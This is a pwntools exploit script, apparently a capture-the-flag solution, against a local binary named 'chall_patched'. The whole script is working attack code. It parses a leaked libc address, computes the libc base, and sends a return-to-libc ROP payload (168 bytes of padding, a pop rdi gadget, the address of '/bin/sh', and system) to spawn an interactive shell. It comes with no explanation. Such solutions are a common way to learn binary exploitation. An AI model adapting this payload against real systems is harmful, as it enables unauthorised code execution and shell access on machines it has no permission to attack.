#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./chall_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
rop = ROP(elf)

io = process()

io.recvuntil(b'0x7')
mid = b'0x7' + io.recvuntil('0x')
leak = int(mid[:-2],16)
log.info(f'leak: {hex(leak)}')

libc.address = leak - libc.sym.wctrans
log.info(f'libc address: {hex(libc.address)}')

pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A'*168
payload += pack(pop_rdi)
payload += pack(bin_sh)
payload += pack(ret)
payload += pack(system)

io.sendline(payload)

io.interactive()
